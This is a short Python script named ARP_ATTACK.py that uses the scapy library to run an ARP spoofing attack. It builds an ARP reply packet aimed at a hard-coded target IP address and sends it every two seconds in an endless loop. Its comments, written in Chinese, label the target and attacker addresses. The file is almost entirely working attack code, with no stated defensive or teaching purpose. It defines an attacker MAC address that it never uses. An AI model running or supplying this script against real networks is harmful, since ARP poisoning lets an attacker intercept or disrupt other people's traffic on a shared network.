# -*- coding =  utf-8 -*-
"""
@Time : 2024/3/7 15:57
@Author: huangkai2
@File:ARP_ATTACK.py
@Software: PyCharm
"""
from scapy.all import *
import time

# 目标IP地址和MAC地址
target_ip = "172.24.235.105"
# target_mac = "00:11:22:33:44:55"

# 攻击者IP地址和MAC地址
attacker_ip = "120.202.184.112"
attacker_mac = "B8-1E-A4-71-12-3D"

# 创建ARP数据包
arp_packet = ARP(op=2, pdst=target_ip,psrc=attacker_ip)

# 循环发送ARP数据包，每2秒发送一次
while True:
    send(arp_packet)
    time.sleep(2)